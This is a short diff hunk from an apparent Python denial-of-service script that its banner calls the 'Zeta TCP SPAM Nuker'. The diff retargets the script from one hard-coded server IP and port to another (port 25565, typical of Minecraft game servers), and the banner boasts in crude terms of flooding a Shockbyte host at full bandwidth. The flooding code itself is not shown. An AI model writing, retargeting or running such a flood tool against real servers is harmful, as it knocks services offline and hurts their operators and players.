@@ -4,8 +4,8 @@ import time
 import threading
 import os
 
-TARGET_IP = "157.85.94.57"
-TARGET_PORT = 26949
+TARGET_IP = "132.226.209.34"
+TARGET_PORT = 25565
 
 print("=== Zeta TCP SPAM Nuker - Shockbyte 157.85.94.57:26949 ===")
 print("Pure TCP mode - Max bandwidth rape activated\n")
